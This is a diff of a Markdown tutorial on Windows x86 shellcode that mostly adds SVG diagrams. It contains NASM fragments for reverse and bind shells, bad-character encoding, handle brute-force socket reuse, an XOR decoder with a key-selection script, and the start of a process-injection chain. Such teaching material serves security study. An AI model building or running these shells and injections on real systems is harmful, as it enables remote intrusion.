+  <rect x="170" y="128" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="210" y="148" text-anchor="middle" fill="#a6e3a1" font-size="11">0xC0</text>
+  <rect x="260" y="128" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="300" y="148" text-anchor="middle" fill="#a6e3a1" font-size="11">0xA8</text>
+  <rect x="350" y="128" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="390" y="148" text-anchor="middle" fill="#a6e3a1" font-size="11">0x01</text>
+  <rect x="440" y="128" width="80" height="32" rx="3" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="480" y="148" text-anchor="middle" fill="#a6e3a1" font-size="11">0x01</text>
+  <text x="620" y="148" text-anchor="middle" fill="#a6e3a1" font-size="10">192.168.1.1</text>
+  <!-- Row 3: sin_zero -->
+  <rect x="60" y="166" width="80" height="32" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="100" y="186" text-anchor="middle" fill="#89b4fa" font-size="11">+0x08</text>
+  <rect x="170" y="166" width="350" height="32" rx="3" fill="#1e1e2e" stroke="#6c7086" stroke-width="1"/>
+  <text x="345" y="186" text-anchor="middle" fill="#6c7086" font-size="11">0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</text>
+  <text x="620" y="186" text-anchor="middle" fill="#6c7086" font-size="10">sin_zero (padding)</text>
+  <!-- NOT encoding note -->
+  <rect x="80" y="215" width="590" height="48" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="375" y="235" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">NOT Encoding for sin_family + sin_port (0xBB010002):</text>
+  <text x="375" y="252" text-anchor="middle" fill="#cdd6f4" font-size="11">push 0x44fefffd -> pop eax -> not eax -> 0xBB010002 (no null bytes!)</text>
+</svg></div>
+
+*Figure 10.1 - The sockaddr_in struct has sin_family (AF_INET=2), sin_port (443 in network byte order), and sin_addr (target IP). NOT encoding avoids the null byte in 0xBB010002.*
+
 ```nasm
     xor   eax, eax
     push  eax                   ; sin_zero padding
@@ -839,7 +1470,7 @@ load_ws2_32:
     mov   esi, esp              ; ESI -> sockaddr_in
 ```
 
-### STARTUPINFOA -- Redirecting stdio to the Socket
+### STARTUPINFOA: Redirecting stdio to the Socket
 
 The critical fields: `dwFlags = 0x100` (STARTF_USESTDHANDLES), and `hStdInput/hStdOutput/hStdError` all set to the socket handle. This is what makes the shell interactive over the network.
 
@@ -894,7 +1525,7 @@ The critical fields: `dwFlags = 0x100` (STARTF_USESTDHANDLES), and `hStdInput/hS
 <text x="375" y="408" text-anchor="middle" fill="#cdd6f4" font-size="12">cmd.exe stdout -> socket -> attacker sees output</text>
 </svg></div>
 
-*Figure 10.1 - Reverse shell data flow: the target connects out to the attacker, and STARTUPINFOA redirects all stdio through the socket*
+*Figure 10.2 - Reverse shell data flow: the target connects out to the attacker, and STARTUPINFOA redirects all stdio through the socket.*
 
 ---
 
@@ -905,6 +1536,48 @@ A **bind shell** is the mirror image of a reverse shell. Instead of connecting o
 The bind shell trades `connect` for three new functions: `bind`, `listen`, and `accept`. It also uses `WaitForSingleObject` to keep the shellcode alive.
 
 ### The rep stosb Zeroing Technique
+
+We need to zero out 68 bytes for the `STARTUPINFOA` structure. Rather than pushing 17 individual zero DWORDs, we use `rep stosb`.
+
+<div align="center"><svg viewBox="0 0 750 230" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="bs-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="230" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">rep stosb: Fast Memory Zeroing</text>
+  <!-- Before -->
+  <text x="100" y="58" text-anchor="middle" fill="#fab387" font-size="11" font-weight="bold">Before</text>
+  <rect x="30" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="44" y="86" text-anchor="middle" fill="#f38ba8" font-size="9">??</text>
+  <rect x="62" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="76" y="86" text-anchor="middle" fill="#f38ba8" font-size="9">??</text>
+  <rect x="94" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="108" y="86" text-anchor="middle" fill="#f38ba8" font-size="9">??</text>
+  <rect x="126" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#f38ba8" stroke-width="1"/>
+  <text x="140" y="86" text-anchor="middle" fill="#f38ba8" font-size="9">??</text>
+  <text x="175" y="86" text-anchor="middle" fill="#6c7086" font-size="11">...</text>
+  <!-- After -->
+  <text x="470" y="58" text-anchor="middle" fill="#a6e3a1" font-size="11" font-weight="bold">After (68 iterations)</text>
+  <rect x="380" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="394" y="86" text-anchor="middle" fill="#a6e3a1" font-size="9">00</text>
+  <rect x="412" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="426" y="86" text-anchor="middle" fill="#a6e3a1" font-size="9">00</text>
+  <rect x="444" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="458" y="86" text-anchor="middle" fill="#a6e3a1" font-size="9">00</text>
+  <rect x="476" y="68" width="28" height="28" rx="2" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="490" y="86" text-anchor="middle" fill="#a6e3a1" font-size="9">00</text>
+  <text x="525" y="86" text-anchor="middle" fill="#6c7086" font-size="11">...</text>
+  <!-- Mechanism -->
+  <rect x="80" y="115" width="590" height="95" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="375" y="138" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">How rep stosb Works</text>
+  <text x="140" y="162" text-anchor="middle" fill="#fab387" font-size="11">AL = 0x00</text>
+  <text x="300" y="162" text-anchor="middle" fill="#fab387" font-size="11">ECX = 68 (0x44)</text>
+  <text x="500" y="162" text-anchor="middle" fill="#fab387" font-size="11">EDI = destination</text>
+  <text x="375" y="185" text-anchor="middle" fill="#cdd6f4" font-size="11">Each iteration: [EDI] = AL, EDI++, ECX--</text>
+  <text x="375" y="202" text-anchor="middle" fill="#a6e3a1" font-size="11">Stops when ECX reaches 0. Two instructions instead of 17 pushes.</text>
+</svg></div>
+
+*Figure 11.0 - rep stosb writes AL (zero) to each byte at EDI, advancing EDI and decrementing ECX until ECX reaches zero.*
 
 ```nasm
 zero_structs:
@@ -966,13 +1639,74 @@ zero_structs:
 <text x="555" y="334" text-anchor="middle" fill="#cdd6f4" font-size="10">Must use the NEW one for stdio.</text>
 </svg></div>
 
-*Figure 11.1 - Bind shell sequence: bind to a port, listen, block on accept, then spawn a shell using the accepted client socket*
+*Figure 11.1 - Bind shell sequence: bind to a port, listen, block on accept, then spawn a shell using the accepted client socket.*
 
 ---
 
 ## 12. Working Under Restrictions: A Case Study
 
 What if the vulnerability filters out far more than just `0x00`? Real-world exploits often have extensive bad character lists. When half the byte range is off limits, every constant must be constructed indirectly.
+
+<div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="380" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Encoding Adapter: Raw Value to Null-Free Assembly</text>
+  <!-- Raw value -->
+  <rect x="40" y="50" width="200" height="45" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="140" y="70" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">Raw Constant</text>
+  <text x="140" y="86" text-anchor="middle" fill="#cdd6f4" font-size="11">Contains bad bytes</text>
+  <!-- Arrow -->
+  <text x="290" y="76" text-anchor="middle" fill="#a6e3a1" font-size="18" font-weight="bold">---></text>
+  <!-- Encoding layer -->
+  <rect x="330" y="50" width="200" height="45" rx="6" fill="#313244" stroke="#fab387" stroke-width="2"/>
+  <text x="430" y="70" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">Encoding Layer</text>
+  <text x="430" y="86" text-anchor="middle" fill="#cdd6f4" font-size="11">Transform pattern</text>
+  <!-- Arrow -->
+  <text x="575" y="76" text-anchor="middle" fill="#a6e3a1" font-size="18" font-weight="bold">---></text>
+  <!-- Clean output -->
+  <rect x="610" y="50" width="110" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="665" y="70" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">Clean ASM</text>
+  <text x="665" y="86" text-anchor="middle" fill="#cdd6f4" font-size="11">No bad chars</text>
+  <!-- Pattern examples -->
+  <rect x="40" y="115" width="330" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="55" y="136" fill="#89b4fa" font-size="11" font-weight="bold">NEG:</text>
+  <text x="165" y="136" text-anchor="middle" fill="#f38ba8" font-size="11">0x06</text>
+  <text x="215" y="136" text-anchor="middle" fill="#6c7086" font-size="11">-></text>
+  <text x="310" y="136" text-anchor="middle" fill="#a6e3a1" font-size="11">mov al,0xFA; neg al</text>
+  <text x="205" y="158" text-anchor="middle" fill="#6c7086" font-size="10">NEG flips sign: 0x100 - 0xFA = 0x06</text>
+  <rect x="40" y="178" width="330" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="55" y="199" fill="#89b4fa" font-size="11" font-weight="bold">XOR:</text>
+  <text x="165" y="199" text-anchor="middle" fill="#f38ba8" font-size="11">0x0501A8C0</text>
+  <text x="225" y="199" text-anchor="middle" fill="#6c7086" font-size="11">-></text>
+  <text x="310" y="199" text-anchor="middle" fill="#a6e3a1" font-size="11">mov+xor 0x50505050</text>
+  <text x="205" y="221" text-anchor="middle" fill="#6c7086" font-size="10">XOR with key: 0x5551F890 ^ 0x50505050</text>
+  <rect x="380" y="115" width="340" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="395" y="136" fill="#89b4fa" font-size="11" font-weight="bold">SHL:</text>
+  <text x="520" y="136" text-anchor="middle" fill="#f38ba8" font-size="11">0xBB01</text>
+  <text x="570" y="136" text-anchor="middle" fill="#6c7086" font-size="11">-></text>
+  <text x="660" y="136" text-anchor="middle" fill="#a6e3a1" font-size="11">al=0xBB; shl; inc</text>
+  <text x="550" y="158" text-anchor="middle" fill="#6c7086" font-size="10">Build port 443 byte-by-byte</text>
+  <rect x="380" y="178" width="340" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="395" y="199" fill="#89b4fa" font-size="11" font-weight="bold">NOT:</text>
+  <text x="520" y="199" text-anchor="middle" fill="#f38ba8" font-size="11">0x00000100</text>
+  <text x="570" y="199" text-anchor="middle" fill="#6c7086" font-size="11">-></text>
+  <text x="660" y="199" text-anchor="middle" fill="#a6e3a1" font-size="11">push ~val; not eax</text>
+  <text x="550" y="221" text-anchor="middle" fill="#6c7086" font-size="10">0xFFFFFEFF has no null bytes</text>
+  <!-- Split ROR + INC/DEC -->
+  <rect x="40" y="245" width="330" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="55" y="266" fill="#89b4fa" font-size="11" font-weight="bold">Split ROR:</text>
+  <text x="205" y="266" text-anchor="middle" fill="#f38ba8" font-size="11">ror edx,0x0D (bad!)</text>
+  <text x="205" y="288" text-anchor="middle" fill="#a6e3a1" font-size="10">ror edx,0x07; ror edx,0x06 (7+6=13)</text>
+  <rect x="380" y="245" width="340" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="395" y="266" fill="#89b4fa" font-size="11" font-weight="bold">INC/DEC:</text>
+  <text x="550" y="266" text-anchor="middle" fill="#f38ba8" font-size="11">mov eax, 2 (bad!)</text>
+  <text x="550" y="288" text-anchor="middle" fill="#a6e3a1" font-size="10">xor eax,eax; inc eax; inc eax</text>
+  <!-- Summary -->
+  <rect x="120" y="318" width="510" height="42" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="375" y="338" text-anchor="middle" fill="#a6e3a1" font-size="12">The same shellcode logic, with an encoding wrapper around every constant.</text>
+  <text x="375" y="354" text-anchor="middle" fill="#6c7086" font-size="10">Patterns are composable: a single value might need shift + NOT + INC.</text>
+</svg></div>
+
+*Figure 12.1 - The encoding adapter concept: each raw constant passes through a transform pattern that produces the same value using only safe bytes.*
 
 The core encoding patterns for a restricted-charset reverse shell:
 
@@ -1002,6 +1736,49 @@ Every shellcode technique so far creates a *new* network connection. **Socket re
 
 We brute-force handle values from `0x50` to `0x400`, calling `getpeername()` on each. If it succeeds and the returned port matches ours, we have found our socket.
 
+<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="260" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Handle Brute-Force Scan</text>
+  <text x="375" y="52" text-anchor="middle" fill="#6c7086" font-size="11">Testing handle values 0x50 to 0x400 with getpeername()</text>
+  <!-- Handle boxes -->
+  <rect x="35" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="67" y="86" text-anchor="middle" fill="#cdd6f4" font-size="10">0x50</text>
+  <text x="67" y="102" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">X</text>
+  <rect x="110" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="142" y="86" text-anchor="middle" fill="#cdd6f4" font-size="10">0x54</text>
+  <text x="142" y="102" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">X</text>
+  <rect x="185" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="217" y="86" text-anchor="middle" fill="#cdd6f4" font-size="10">0x58</text>
+  <text x="217" y="102" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">X</text>
+  <rect x="260" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#6c7086" stroke-width="1" stroke-dasharray="4,3"/>
+  <text x="292" y="92" text-anchor="middle" fill="#6c7086" font-size="14">...</text>
+  <rect x="335" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="367" y="86" text-anchor="middle" fill="#cdd6f4" font-size="10">0x9C</text>
+  <text x="367" y="102" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">X</text>
+  <rect x="410" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#fab387" stroke-width="2"/>
+  <text x="442" y="86" text-anchor="middle" fill="#cdd6f4" font-size="10">0xA0</text>
+  <text x="442" y="102" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">?</text>
+  <rect x="485" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#a6e3a1" stroke-width="2.5"/>
+  <text x="517" y="86" text-anchor="middle" fill="#cdd6f4" font-size="10">0xA4</text>
+  <text x="517" y="102" text-anchor="middle" fill="#a6e3a1" font-size="14" font-weight="bold">V</text>
+  <rect x="560" y="70" width="65" height="40" rx="4" fill="#313244" stroke="#6c7086" stroke-width="1" stroke-dasharray="4,3"/>
+  <text x="592" y="92" text-anchor="middle" fill="#6c7086" font-size="14">...</text>
+  <rect x="635" y="70" width="80" height="40" rx="4" fill="#313244" stroke="#6c7086" stroke-width="1"/>
+  <text x="675" y="86" text-anchor="middle" fill="#6c7086" font-size="10">0x400</text>
+  <text x="675" y="102" text-anchor="middle" fill="#6c7086" font-size="10">end</text>
+  <!-- Legend -->
+  <rect x="80" y="130" width="590" height="48" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="185" y="150" text-anchor="middle" fill="#f38ba8" font-size="11">X = getpeername() failed (not a socket)</text>
+  <text x="430" y="150" text-anchor="middle" fill="#fab387" font-size="11">? = socket but wrong port</text>
+  <text x="555" y="170" text-anchor="middle" fill="#a6e3a1" font-size="11" font-weight="bold">V = port matches! Use this handle.</text>
+  <!-- Result -->
+  <rect x="160" y="195" width="430" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="375" y="215" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">Handle 0xA4: getpeername() OK, sin_port == 0x5C11 (4444)</text>
+  <text x="375" y="232" text-anchor="middle" fill="#cdd6f4" font-size="10">Redirect STARTUPINFOA stdio to this handle</text>
+</svg></div>
+
+*Figure 13.0 - Handle brute-force: iterate from 0x50, test each with getpeername, skip failures and wrong ports, stop at the matching socket.*
+
 ```nasm
 call_getpeername:
     xor   eax, eax
@@ -1027,7 +1804,7 @@ call_getpeername:
 
 <div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah13" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Socket Reuse: Handle Enumeration</text><rect x="30" y="55" width="130" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="95" y="85" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">handle = 0x50</text><line x1="160" y1="80" x2="195" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="200" y="55" width="165" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="282" y="76" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">getpeername(handle,</text><text x="282" y="92" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">&addr, &len)</text><line x1="365" y1="80" x2="395" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="400" y="55" width="120" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/><text x="460" y="76" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Return != 0?</text><text x="460" y="92" fill="#f38ba8" font-family="Consolas,monospace" font-size="10" text-anchor="middle">Not a socket</text><line x1="520" y1="80" x2="555" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="560" y="55" width="155" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="637" y="76" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">sin_port == 0x5C11?</text><text x="637" y="92" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">(port 4444)</text><rect x="220" y="145" width="310" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="375" y="170" fill="#a6e3a1" font-family="Consolas,monospace" font-size="12" text-anchor="middle" font-weight="bold">MATCH! Use handle for STARTUPINFOA</text><text x="375" y="188" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">All I/O flows through original exploit socket</text><line x1="637" y1="105" x2="530" y2="155" stroke="#a6e3a1" stroke-width="2"/><text x="600" y="135" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10">YES</text></svg></div>
 
-*Figure 13.1 - Socket reuse: scan handles, test with getpeername, match port, redirect stdio*
+*Figure 13.1 - Socket reuse: scan handles, test with getpeername, match port, redirect stdio.*
 
 ---
 
@@ -1036,6 +1813,8 @@ call_getpeername:
 Manually avoiding bad characters one instruction at a time works for small payloads. For larger ones, **XOR encoding** transforms the entire payload so no bad characters remain, then decodes it at runtime.
 
 ### The Decoder Loop
+
+The decoder stub sits in front of the encoded payload and restores each byte before execution.
 
 ```nasm
 decode_loop:
@@ -1048,6 +1827,53 @@ The **`loop`** instruction decrements ECX by 1 and jumps if non-zero. After all 
 
 ### Key Selection Script
 
+The key must itself be a safe byte, and XOR-ing every payload byte with it must produce only safe bytes.
+
+<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="260" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">XOR Key Selection</text>
+  <!-- Original payload -->
+  <text x="100" y="58" text-anchor="middle" fill="#fab387" font-size="11" font-weight="bold">Original Payload</text>
+  <rect x="30" y="68" width="42" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="51" y="87" text-anchor="middle" fill="#cdd6f4" font-size="11">31</text>
+  <rect x="76" y="68" width="42" height="30" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="97" y="87" text-anchor="middle" fill="#f38ba8" font-size="11">00</text>
+  <rect x="122" y="68" width="42" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="143" y="87" text-anchor="middle" fill="#cdd6f4" font-size="11">C9</text>
+  <rect x="168" y="68" width="42" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="189" y="87" text-anchor="middle" fill="#cdd6f4" font-size="11">64</text>
+  <rect x="214" y="68" width="42" height="30" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="235" y="87" text-anchor="middle" fill="#f38ba8" font-size="11">0A</text>
+  <rect x="260" y="68" width="42" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="281" y="87" text-anchor="middle" fill="#cdd6f4" font-size="11">8B</text>
+  <text x="325" y="87" text-anchor="middle" fill="#6c7086" font-size="11">...</text>
+  <text x="475" y="87" text-anchor="middle" fill="#f38ba8" font-size="11">Bad chars: 0x00, 0x0A highlighted in red</text>
+  <!-- XOR operation -->
+  <text x="170" y="120" text-anchor="middle" fill="#a6e3a1" font-size="14" font-weight="bold">XOR each byte with key 0xAA</text>
+  <!-- Encoded result -->
+  <text x="100" y="150" text-anchor="middle" fill="#a6e3a1" font-size="11" font-weight="bold">Encoded Payload</text>
+  <rect x="30" y="160" width="42" height="30" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="51" y="179" text-anchor="middle" fill="#a6e3a1" font-size="11">9B</text>
+  <rect x="76" y="160" width="42" height="30" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="97" y="179" text-anchor="middle" fill="#a6e3a1" font-size="11">AA</text>
+  <rect x="122" y="160" width="42" height="30" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="143" y="179" text-anchor="middle" fill="#a6e3a1" font-size="11">63</text>
+  <rect x="168" y="160" width="42" height="30" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="189" y="179" text-anchor="middle" fill="#a6e3a1" font-size="11">CE</text>
+  <rect x="214" y="160" width="42" height="30" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="235" y="179" text-anchor="middle" fill="#a6e3a1" font-size="11">A0</text>
+  <rect x="260" y="160" width="42" height="30" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="281" y="179" text-anchor="middle" fill="#a6e3a1" font-size="11">21</text>
+  <text x="325" y="179" text-anchor="middle" fill="#6c7086" font-size="11">...</text>
+  <text x="475" y="179" text-anchor="middle" fill="#a6e3a1" font-size="11">All bytes are now safe (no 0x00, 0x0A, 0x0D)</text>
+  <!-- Summary -->
+  <rect x="80" y="205" width="590" height="40" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="375" y="222" text-anchor="middle" fill="#cdd6f4" font-size="11">Key 0xAA valid: not in bad_chars AND (every_byte ^ 0xAA) not in bad_chars</text>
+  <text x="375" y="238" text-anchor="middle" fill="#6c7086" font-size="10">Script tests all 255 keys and picks the first one that clears the entire payload</text>
+</svg></div>
+
+*Figure 14.0 - Key selection: find a byte that, when XORed with every payload byte, produces no bad characters.*
+
 ```python
 for key in range(1, 256):
     if key in bad_chars:
@@ -1059,7 +1885,7 @@ for key in range(1, 256):
 
 <div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">XOR Decode Loop (key = 0xAA)</text><text x="60" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Iter</text><text x="180" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Before</text><text x="340" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Operation</text><text x="510" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">After</text><rect x="20" y="85" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="109" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">1</text><text x="180" y="109" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8</text><text x="340" y="109" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8 XOR 0xAA</text><text x="510" y="109" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x72 = 'r'</text><rect x="20" y="128" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="152" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">2</text><text x="180" y="152" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF</text><text x="340" y="152" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF XOR 0xAA</text><text x="510" y="152" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x65 = 'e'</text><rect x="20" y="171" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="195" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">3</text><text x="180" y="195" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7</text><text x="340" y="195" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7 XOR 0xAA</text><text x="510" y="195" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6D = 'm'</text><rect x="20" y="214" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="238" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">4</text><text x="180" y="238" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5</text><text x="340" y="238" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5 XOR 0xAA</text><text x="510" y="238" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6F = 'o'</text></svg></div>
 
-*Figure 14.1 - Each iteration XORs one encoded byte back to its original value*
+*Figure 14.1 - Each iteration XORs one encoded byte back to its original value.*
 
 ---
 
@@ -1068,6 +1894,8 @@ for key in range(1, 256):
 **Process injection** transplants our code into a different, stable process. The seven-step chain: Snapshot, Enumerate, Find, Open, Allocate, Write, Execute.
 
 ### Finding the Target Process
+
+We compare the process name DWORD by DWORD against `"notepad.exe"`. The third DWORD uses a shift chain to avoid the null byte in `"exe\0"`.
 
 ```nasm
 find_process:
@@ -1087,9 +1915,82 @@ find_process:
     jmp  found_explorer
 ```
 
-<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah15" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Process Injection Chain</text><rect x="30" y="55" width="140" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="100" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">1. Snapshot</text><text x="100" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">CreateToolhelp32</text><line x1="170" y1="77" x2="195" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="200" y="55" width="100" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="250" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">2. Enumerate</text><text x="250" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Process32Next</text><line x1="300" y1="77" x2="325" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="330" y="55" width="90" 